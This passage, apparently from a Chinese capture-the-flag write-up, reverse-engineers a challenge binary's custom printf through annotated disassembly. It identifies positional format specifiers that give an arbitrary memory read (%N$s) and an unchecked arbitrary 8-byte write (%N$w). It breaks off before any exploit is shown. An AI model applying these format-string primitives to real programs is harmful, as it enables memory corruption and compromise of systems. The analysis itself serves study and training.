主迴圈：解析格式字串}\label{ux4e3bux8ff4ux5708ux89e3ux6790ux683cux5f0fux5b57ux4e32}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  4013e8: 3c 25              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x25}       \CommentTok{; 是 \textquotesingle{}\%\textquotesingle{} 嗎？}
\NormalTok{  4013ea: 0f 85 b8 }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  jne  }\BaseNTok{0x4014a8}       \CommentTok{; 不是 → 逐字元印出（見 4.6）}
\NormalTok{  4013f0: 41 0f b6 }\DecValTok{47} \DecValTok{01}\NormalTok{     movzx }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r15}\OperatorTok{+}\DecValTok{1}\OperatorTok{]}  \CommentTok{; 看 \textquotesingle{}\%\textquotesingle{} 後面那個字元}
\NormalTok{  4013f5: 4d 8d 6f 01        }\BuiltInTok{lea}  \KeywordTok{r13}\OperatorTok{,[}\KeywordTok{r15}\OperatorTok{+}\DecValTok{1}\OperatorTok{]}            \CommentTok{; r13 = 指向 \textquotesingle{}\%\textquotesingle{} 後面那個字元}
\NormalTok{  4013f9: 3c 25              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x25}
\NormalTok{  4013fb: 0f 84 07 01 00 00  }\ControlFlowTok{je}   \BaseNTok{0x401508}       \CommentTok{; "\%\%" → 印一個 \textquotesingle{}\%\textquotesingle{}}
\NormalTok{  401401: 84 c0              test }\KeywordTok{al}\OperatorTok{,}\KeywordTok{al}
\NormalTok{  401403: 0f 84 88 00 00 00  }\ControlFlowTok{je}   \BaseNTok{0x401491}       \CommentTok{; "\%\textbackslash{}0" → 結束}
\NormalTok{  401409: 8d 50 d0           lea  }\KeywordTok{edx}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}  \CommentTok{; edx = 字元 {-} \textquotesingle{}0\textquotesingle{}}
\NormalTok{  40140c: 80 fa }\DecValTok{09}\NormalTok{           cmp  }\KeywordTok{dl}\OperatorTok{,}\BaseNTok{0x9}
\NormalTok{  40140f: 0f 87 ab }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  ja   }\BaseNTok{0x4014c0}       \CommentTok{; 不是數字 → 走「流水號模式」}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{4.3 解析
\texttt{\%\allowbreak{}\textless{}\allowbreak{}數字\textgreater{}\allowbreak{}\$\allowbreak{}}（指定第幾個參數）}{4.3 解析 \%\textless 數字\textgreater\$（指定第幾個參數）}}\label{ux89e3ux6790-ux6578ux5b57ux6307ux5b9aux7b2cux5e7eux500bux53c3ux6578}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  401415: 31 f6              }\OperatorTok{xor}  \KeywordTok{esi}\OperatorTok{,}\KeywordTok{esi}          \CommentTok{; esi = 累計值 = 0}
\NormalTok{  401420: 83 e8 }\DecValTok{30}\NormalTok{           sub  }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x30}         \CommentTok{; eax = 數字字元 {-} \textquotesingle{}0\textquotesingle{}}
\NormalTok{  401423: 8d 14 b6           lea  }\KeywordTok{edx}\OperatorTok{,[}\KeywordTok{rsi}\OperatorTok{+}\KeywordTok{rsi}\OperatorTok{*}\DecValTok{4}\OperatorTok{]}  \CommentTok{; edx = 值 * 5}
\NormalTok{  401426: 4c 89 e9           mov  }\KeywordTok{rcx}\OperatorTok{,}\KeywordTok{r13}          \CommentTok{; rcx = 目前數字的位置}
\NormalTok{  401429: 49 83 c5 }\DecValTok{01}\NormalTok{        add  }\KeywordTok{r13}\OperatorTok{,}\BaseNTok{0x1}          \CommentTok{; r13++（指向下一個字元）}
\NormalTok{  40142d: 0f be c0           movsx }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{al}          \CommentTok{; 符號擴展}
\NormalTok{  401430: 8d 34 50           }\BuiltInTok{lea}  \KeywordTok{esi}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{+}\KeywordTok{rdx}\OperatorTok{*}\DecValTok{2}\OperatorTok{]}  \CommentTok{; ✶ esi = 數字 + 值*10（十進位累加，32{-}bit）}
\NormalTok{  401433: 41 0f b6 }\DecValTok{45} \DecValTok{00}\NormalTok{     movzx }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r13}\OperatorTok{+}\BaseNTok{0x0}\OperatorTok{]}  \CommentTok{; 讀下一個字元}
\NormalTok{  401438: 8d 50 d0           lea  }\KeywordTok{edx}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}
\NormalTok{  40143b: 80 fa }\DecValTok{09}\NormalTok{           cmp  }\KeywordTok{dl}\OperatorTok{,}\BaseNTok{0x9}
\NormalTok{  40143e: 76 e0              jbe  }\BaseNTok{0x401420}         \CommentTok{; 還是數字 → 繼續累加}
\NormalTok{  401440: 3c 24              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x24}          \CommentTok{; 是 \textquotesingle{}$\textquotesingle{} 嗎？}
\NormalTok{  401442: 75 3c              }\ControlFlowTok{jne}  \BaseNTok{0x401480}         \CommentTok{; 不是 → 這種寫法無效，跳過}
\NormalTok{  401444: 0f b6 }\DecValTok{41} \DecValTok{02}\NormalTok{        movzx }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rcx}\OperatorTok{+}\BaseNTok{0x2}\OperatorTok{]}  \CommentTok{; 取 \textquotesingle{}$\textquotesingle{} 後面那個字元（=格式字元）}
\NormalTok{  401448: 4c 8d 69 02        }\BuiltInTok{lea}  \KeywordTok{r13}\OperatorTok{,[}\KeywordTok{rcx}\OperatorTok{+}\BaseNTok{0x2}\OperatorTok{]}
\end{Highlighting}
\end{Shaded}

這裡就是 \texttt{atoi} 的手寫版，用的是
\texttt{值*10\ \allowbreak{}+\ \allowbreak{}數字}（\texttt{lea\ \allowbreak{}edx,{[}rsi+rsi*4{]}} 是
\texttt{*5}， 再 \texttt{lea\ \allowbreak{}esi,{[}rax+rdx*2{]}} 就是
\texttt{數字\ \allowbreak{}+\ \allowbreak{}值*10}）。

\paragraph{4.4 格式字元分派}\label{ux683cux5f0fux5b57ux5143ux5206ux6d3e}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  40144c: 3c 77              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x77}        \CommentTok{; \textquotesingle{}w\textquotesingle{} ?}
\NormalTok{  40144e: 74 7d              }\ControlFlowTok{je}   \BaseNTok{0x4014cd}       \CommentTok{; → 寫入原語 \%N$w}
\NormalTok{  401450: 0f 8f ca }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  jg   }\BaseNTok{0x401520}       \CommentTok{; 大於 \textquotesingle{}w\textquotesingle{} → 檢查 \textquotesingle{}x\textquotesingle{}}
\NormalTok{  401456: 3c 70              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x70}       \CommentTok{; \textquotesingle{}p\textquotesingle{} ?}
\NormalTok{  401458: 0f 84 e2 }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  je   }\BaseNTok{0x401540}       \CommentTok{; → 16 進位輸出 \%N$p}
\NormalTok{  40145e: 3c 73              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x73}       \CommentTok{; \textquotesingle{}s\textquotesingle{} ?}
\NormalTok{  401460: 0f 85 be }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  jne  }\BaseNTok{0x401524}       \CommentTok{; 其他 → 原樣印出該字元}
  \CommentTok{; {-}{-}{-} \%N$s：任意位址讀字串 {-}{-}{-}}
\NormalTok{  401466: 48 8d 7c 24 18     }\BuiltInTok{lea}  \KeywordTok{rdi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x18}\OperatorTok{]}   \CommentTok{; rdi = \&va\_list}
\NormalTok{  40146b: e8 }\DecValTok{50}\NormalTok{ fe ff ff     call }\BaseNTok{0x4012c0}         \CommentTok{; rax = get\_arg(va, N)}
\NormalTok{  401470: 49 89 c7           mov  }\KeywordTok{r15}\OperatorTok{,}\KeywordTok{rax}          \CommentTok{; r15 = 取到的指標}
\NormalTok{  401473: 48 85 c0           test }\KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{  401476: 0f 85 21 01 00 00  }\ControlFlowTok{jne}  \BaseNTok{0x40159d}        \CommentTok{; 非 NULL → 去印}
\NormalTok{  40147c: (NULL → 什麼都不印}\OperatorTok{)}

\NormalTok{  40159d: 48 89 c7           mov  }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{  4015a0: e8 eb fa ff ff     call }\BaseNTok{0x401090}         \CommentTok{; strlen(r15)}
\NormalTok{  4015a5: 4c 89 fe           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{r15}
\NormalTok{  4015a8: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  4015ad: 48 89 c2           mov  }\KeywordTok{rdx}\OperatorTok{,}\KeywordTok{rax}           \CommentTok{; 長度 = strlen}
\NormalTok{  4015b0: e8 cb fa ff ff     call }\BaseNTok{0x401080}         \CommentTok{; write(1, r15, strlen(r15))  ✶ 任意讀！}
\end{Highlighting}
\end{Shaded}

\begin{Shaded}
\begin{Highlighting}[]
  \CommentTok{; {-}{-}{-} \%N$p / \%N$x：把「參數值」以 0x + 16 個 16 進位數字印出 {-}{-}{-}}
\NormalTok{  401540: 48 8d 7c 24 18     }\BuiltInTok{lea}  \KeywordTok{rdi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{  401545: e8 }\DecValTok{76}\NormalTok{ fd ff ff     call }\BaseNTok{0x4012c0}         \CommentTok{; rax = get\_arg(va, N)}
\NormalTok{  40154a: 48 8d 54 24 02     }\BuiltInTok{lea}  \KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x2}\OperatorTok{]}    \CommentTok{; 輸出指標（從 rsp+2 開始）}
\NormalTok{  40154f: b9 }\DecValTok{3}\ErrorTok{c} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{ecx}\OperatorTok{,}\BaseNTok{0x3c}         \CommentTok{; 先移 60 bits（最高 nibble）}
\NormalTok{  401554: 0f b7 }\DecValTok{3}\BaseNTok{d} \FloatTok{0}\BaseNTok{f} \BaseNTok{0b} \DecValTok{00} \DecValTok{00}\NormalTok{  movzx }\KeywordTok{edi}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xb0f}\OperatorTok{]}  \CommentTok{; 0x40206a = "0x"}
\NormalTok{  40155b: 66 89 3c 24        }\BuiltInTok{mov}  \DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{],}\KeywordTok{di}          \CommentTok{; 把 "0x" 寫到堆疊暫存區}
\NormalTok{  40155f: 48 8d 7c 24 12     }\BuiltInTok{lea}  \KeywordTok{rdi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x12}\OperatorTok{]}   \CommentTok{; 結束位址 = rsp+18}
\NormalTok{  401568: 48 89 c6           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{  40156b: 48 83 c2 }\DecValTok{01}\NormalTok{        add  }\KeywordTok{rdx}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  40156f: 48 d3 ee           }\OperatorTok{shr}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{cl}           \CommentTok{; 右移 cl bits}
\NormalTok{  401572: 83 e9 }\DecValTok{04}\NormalTok{           sub  }\KeywordTok{ecx}\OperatorTok{,}\BaseNTok{0x4}
\NormalTok{  401575: 83 e6 }\FloatTok{0}\BaseNTok{f}           \OperatorTok{and}  \KeywordTok{esi}\OperatorTok{,}\BaseNTok{0xf}          \CommentTok{; 取最低 4 bits}
\NormalTok{  401578: 41 0f b6 }\DecValTok{34} \DecValTok{36}\NormalTok{     movzx }\KeywordTok{esi}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r14}\OperatorTok{+}\KeywordTok{rsi}\OperatorTok{*}\DecValTok{1}\OperatorTok{]}   \CommentTok{; 查表 "0123456789abcdef"}
\NormalTok{  40157d: 40 88 72 ff        mov  }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{{-}}\BaseNTok{0x1}\OperatorTok{],}\NormalTok{sil}
\NormalTok{  401581: 48 39 d7           cmp  }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rdx}
\NormalTok{  401584: 75 e2              jne  }\BaseNTok{0x401568}
\NormalTok{  401586: 48 89 e6           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{  401589: ba }\DecValTok{12} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x12}         \CommentTok{; 18 bytes = "0x" + 16 hex}
\NormalTok{  40158e: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  401593: e8 e8 fa ff ff     call }\BaseNTok{0x401080}         \CommentTok{; write(1, rsp, 18)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
注意這段是\textbf{寫在 \texttt{rsp}（printf 自己的堆疊框）的 18 bytes
暫存區}，不是 \texttt{.\allowbreak{}bss}， 也不是什麼會溢位的 \texttt{memcpy}（見 §11
常見坑 7）。
\end{quote}

\begin{Shaded}
\begin{Highlighting}[]
  \CommentTok{; {-}{-}{-} \%N$w：任意位址寫入 8 bytes ✶✶✶ {-}{-}{-}}
\NormalTok{  4014cd: 4c 8d 4c 24 18     }\BuiltInTok{lea}  \KeywordTok{r9}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{  4014d2: 4c 89 cf           mov  }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{r9}
\NormalTok{  4014d5: e8 e6 fd ff ff     call }\BaseNTok{0x4012c0}         \CommentTok{; rax = get\_arg(va, N)     → 「目的位址」}
\NormalTok{  4014da: 83 c6 }\DecValTok{01}\NormalTok{           add  }\KeywordTok{esi}\OperatorTok{,}\BaseNTok{0x1}          \CommentTok{; 參數編號 +1}
\NormalTok{  4014dd: 4c 89 cf           mov  }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{r9}
\NormalTok{  4014e0: 49 89 c0           mov  }\KeywordTok{r8}\OperatorTok{,}\KeywordTok{rax}           \CommentTok{; r8 = 目的位址}
\NormalTok{  4014e3: e8 d8 fd ff ff     call }\BaseNTok{0x4012c0}         \CommentTok{; rax = get\_arg(va, N+1)   → 「要寫的值」}
\NormalTok{  4014e8: ba }\DecValTok{02} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x2}
\NormalTok{  4014ed: 4c 89 e6           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{r12}          \CommentTok{; "ok"}
\NormalTok{  4014f0: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  4014f5: 49 89 00           }\BuiltInTok{mov}  \DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r8}\OperatorTok{],}\KeywordTok{rax}   \CommentTok{; ✶✶ *(u64*)目的 = 值}
\NormalTok{  4014f8: e8 }\DecValTok{83}\NormalTok{ fb ff ff     call }\BaseNTok{0x401080}         \CommentTok{; write(1, "ok", 2)}
\NormalTok{  4014fd: e9 }\DecValTok{7}\ErrorTok{e}\NormalTok{ ff ff ff     jmp  }\BaseNTok{0x401480}
\end{Highlighting}
\end{Shaded}

也就是說：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
%N$w   →   *(uint64_t *) arg[N] = arg[N+1];   write(1, "ok", 2);
\end{Verbatim}

\textbf{沒有任何檢查}：位址可以任意、值可以任意（包含
\texttt{\textbackslash{}\allowbreak{}x00}）。

\paragraph{\texorpdfstring{4.5
\texttt{\%\allowbreak{}\textless{}\allowbreak{}數字\textgreater{}\allowbreak{}}（沒有
\texttt{\$\allowbreak{}}）與流水號模式}{4.5 \%\textless 數字\textgreater（沒有 \$）與流水號模式}}\label{ux6578ux5b57ux6c92ux6709-ux8207ux6d41ux6c34ux865fux6a21ux5f0f}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  4014c0: 83 c3 }\DecValTok{01}\NormalTok{           add  }\KeywordTok{ebx}\OperatorTok{,}\BaseNTok{0x1}          \CommentTok{; ebx++（ebx 是流水號）}
\NormalTok{  4014c3: 89 de              mov  }\KeywordTok{esi}\OperatorTok{,}\KeywordTok{ebx}          \CommentTok{; 用 ebx 當參數編號}
\NormalTok{  4014c5: 3c 77              }\BuiltInTok{cmp}  \KeywordTok{al}\OperatorTok{,}\BaseNTok{0x77}
\NormalTok{  4014c7: 0f 85 83 ff ff ff  jne  }\BaseNTok{0x401450}        \CommentTok{; 回到共用的格式字元分派}
\NormalTok{  401480: 41 0f b6 }\DecValTok{45} \DecValTok{01}\NormalTok{     movzx }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{r13}\OperatorTok{+}\DecValTok{1}\OperatorTok{]}  \CommentTok{; 下一個字元}
\NormalTok{  401485: 4d 8d 7d 01        }\BuiltInTok{lea}  \KeywordTok{r15}\OperatorTok{,[}\KeywordTok{r13}\OperatorTok{+}\DecValTok{1}\OperatorTok{]}
\NormalTok{  401489: 84 c0              test }\KeywordTok{al}\OperatorTok{,}\KeywordTok{al}
\NormalTok{  40148b: 0f 85 57 ff ff ff  jne  }\BaseNTok{0x4013e8}        \CommentTok{; 繼續主迴圈}
\NormalTok{  401491: 48 81 c4 e8 }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  add }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0xe8}    \CommentTok{; 收工}
\NormalTok{  401498: 5b                 }\BuiltInTok{pop}  \KeywordTok{rbx}
\NormalTok{  401499: 5d                 }\BuiltInTok{pop}  \KeywordTok{rbp}
\NormalTok{  40149a: 41 5c              }\BuiltInTok{pop}  \KeywordTok{r12}
\NormalTok{  40149c: 41 5d              }\BuiltInTok{pop}  \KeywordTok{r13}
\NormalTok{  40149e: 41 5e              }\BuiltInTok{pop}  \KeywordTok{r14}
\NormalTok{  4014a0: 41 5f              }\BuiltInTok{pop}  \KeywordTok{r15}
\NormalTok{  4014a2: c3                 ret}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{4.6 不是 \texttt{\%\allowbreak{}}
的字元：一個一個寫出去}{4.6 不是 \% 的字元：一個一個寫出去}}\label{ux4e0dux662f-ux7684ux5b57ux5143ux4e00ux500bux4e00ux500bux5bebux51faux53bb}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  4014a8: ba }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x1}          \CommentTok{; 長度 1}
\NormalTok{  4014ad: 4c 89 fe           mov  }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{r15}          \CommentTok{; 指向那個字元}
\NormalTok{  4014b0: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{     mov  }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  4014b5: 4d 89 fd           mov  }\KeywordTok{r13}\OperatorTok{,}\KeywordTok{r15}
\NormalTok{  4014b8: e8 c3 fb ff ff     call }\BaseNTok{0x401080}         \CommentTok{; write(1, r15, 1)}
\NormalTok{  4014bd: eb c1              jmp  }\BaseNTok{0x401480}
\end{Highlighting}
\end{Shaded}

\textbf{這條路徑會掃到字串的 \texttt{\textbackslash{}\allowbreak{}0} 為止} ------
這個特性等等拿來當「格式字串提前結束」的技巧。

\paragraph{4.7 格式語法總表}\label{ux683cux5f0fux8a9eux6cd5ux7e3dux8868}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
語法
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
行為
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
用途
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{\%\allowbreak{}\%\allowbreak{}} & 印出 \texttt{\%\allowbreak{}} & --- \\
\texttt{\%\allowbreak{}N\$\allowbreak{}s} &
\texttt{write(1,\allowbreak{}\ \allowbreak{}arg{[}N{]},\allowbreak{}\ \allowbreak{}strlen(arg{[}N{]}))}；\texttt{arg{[}N{]}==NULL}
就什麼都不印 & \textbf{任意讀} \\
\texttt{\%\allowbreak{}N\$\allowbreak{}p} & 印出 \texttt{0x} + \texttt{arg{[}N{]}} 的 16 位 16
進位 & 洩漏「值」 \\
\texttt{\%\allowbreak{}N\$\allowbreak{}x} & 同 \texttt{\%\allowbreak{}N\$\allowbreak{}p} & 同 \\
\texttt{\%\allowbreak{}N\$\allowbreak{}w} & \texttt{*(u64*)arg{[}N{]}\ \allowbreak{}=\ \allowbreak{}arg{[}N+1{]}}，然後印
\texttt{ok} & \textbf{任意寫} \\
\texttt{\%\allowbreak{}\textless{}\allowbreak{}數字\textgreater{}\allowbreak{}s}（沒有 \texttt{\$\allowbreak{}}） &
無效，整個跳過 & --- \\
\texttt{\%\allowbreak{}s}（沒有數字） & 使用流水號 \texttt{ebx+1} 當索引 &
本題沒用到 \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{\texorpdfstring{5. 自製 \texttt{va\_\allowbreak{}arg}
逐行解說（\texttt{0x4012c0}）}{5. 自製 va\_arg 逐行解說（0x4012c0）}}\label{ux81eaux88fd-va_arg-ux9010ux884cux89e3ux8aaa0x4012c0}

\texttt{get\_\allowbreak{}arg(rdi\ \allowbreak{}=\ \allowbreak{}va\_\allowbreak{}list*,\allowbreak{}\ \allowbreak{}esi\ \allowbreak{}=\ \allowbreak{}n)}：取第 n 個整數參數。

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{  4012c0: f3 }\FloatTok{0}\BaseNTok{f} \FloatTok{6}\BaseNTok{f} \DecValTok{07}\NormalTok{        movdqu }\KeywordTok{xmm0}\OperatorTok{,}\NormalTok{XMMWORD }\DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdi}\OperatorTok{]}   \CommentTok{; 複製 va\_list 前 16 bytes}
\NormalTok{  4012c4: 0f 11 44 24 e0     movups XMMWORD }\DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x20}\OperatorTok{],}\KeywordTok{xmm0}  \CommentTok{; 存到自己的暫存區}
\NormalTok{  4012c9: 48 8b 7f 10        }\BuiltInTok{mov}    \KeywordTok{rdi}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdi}\OperatorTok{+}\BaseNTok{0x10}\OperatorTok{]} \CommentTok{; 複製第 3 個 8 bytes}
\NormalTok{  4012cd: 48 89 7c 24 f0     mov    }\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{],}\KeywordTok{rdi}
\NormalTok{  4012d2: 85 f6              test   }\KeywordTok{esi}\OperatorTok{,}\KeywordTok{esi}
\NormalTok{  4012d4: 7e 4a              }\ControlFlowTok{jle}    \BaseNTok{0x401320}        \CommentTok{; n \textless{}= 0 → 直接回傳 0}
\NormalTok{  4012d6: 31 c9              }\OperatorTok{xor}    \KeywordTok{ecx}\OperatorTok{,}\KeywordTok{ecx}         \CommentTok{; 已取用個數 = 0}
\NormalTok{  4012d8: eb }\DecValTok{1}\ErrorTok{c}\NormalTok{              jmp    }\BaseNTok{0x4012f6}

\NormalTok{{-}{-}{-} 每輪迴圈 {-}{-}{-}}
\NormalTok{  4012f6: 8b 44 24 e0        mov    }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x20}\OperatorTok{]}  \CommentTok{; eax = gp\_offset}
\NormalTok{  4012fa: 83 f8 }\FloatTok{2}\BaseNTok{f}\NormalTok{           cmp    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x2f}                  \CommentTok{; gp\_offset \textless{}= 47 ?}
\NormalTok{  4012fd: 76 e1              jbe    }\BaseNTok{0x4012e0}                 \CommentTok{; 是 → 從「暫存器存檔區」拿}
\NormalTok{  4012ff: 48 8b 54 24 e8     mov    }\KeywordTok{rdx}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}  \CommentTok{; rdx = overflow\_arg\_area}
\NormalTok{  401304: 83 c1 }\DecValTok{01}\NormalTok{           add    }\KeywordTok{ecx}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  401307: 48 8d 42 08        }\BuiltInTok{lea}    \KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rdx}\OperatorTok{+}\BaseNTok{0x8}\OperatorTok{]}             \CommentTok{; 指標 +8}
\NormalTok{  40130b: 48 89 44 24 e8     mov    }\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\KeywordTok{rax}  \CommentTok{; 存回 overflow\_arg\_area}
\NormalTok{  401310: 48 8b 02           }\BuiltInTok{mov}    \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{]}       \CommentTok{; ✶ 讀出參數}
\NormalTok{  401313: 39 ce              cmp    }\KeywordTok{esi}\OperatorTok{,}\KeywordTok{ecx}
\NormalTok{  401315: 75 }\DataTypeTok{df}\NormalTok{              jne    }\BaseNTok{0x4012f6}                  \CommentTok{; 還沒到第 n 個 → 繼續}
\NormalTok{  401317: c3                 ret}

\NormalTok{{-}{-}{-} gp\_offset 還小於 }\DecValTok{48}\NormalTok{ 時（暫存器區）}\OperatorTok{{-}{-}{-}}
\NormalTok{  4012e0: 89 c2              mov    }\KeywordTok{edx}\OperatorTok{,}\KeywordTok{eax}                   \CommentTok{; edx = gp\_offset}
\NormalTok{  4012e2: 83 c1 }\DecValTok{01}\NormalTok{           add    }\KeywordTok{ecx}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{  4012e5: 83 c0 }\DecValTok{08}\NormalTok{           add    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x8}                   \CommentTok{; gp\_offset += 8}
\NormalTok{  4012e8: 48 01 fa           add    }\KeywordTok{rdx}\OperatorTok{,}\KeywordTok{rdi}                   \CommentTok{; rdx = reg\_save\_area + gp\_offset}
\NormalTok{  4012eb: 89 44 24 e0        mov    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x20}\OperatorTok{],}\KeywordTok{eax}  \CommentTok{; 存回 gp\_offset}
\NormalTok{  4012ef: 48 8b 02           }\BuiltInTok{mov}    \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{]}
\NormalTok{  4012f2: 39 ce              cmp    }\KeywordTok{esi}\OperatorTok{,}\KeywordTok{ecx}
\NormalTok{  4012f4: 74 21              }\ControlFlowTok{je}     \BaseNTok{0x401317}
\NormalTok{  (fallthrough 回 }\BaseNTok{0x4012f6}\OperatorTok{)}
\end{Highlighting}
\end{Shaded}

對照 §4.1 的初始化值，可以得到\textbf{完整的參數對應表}：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
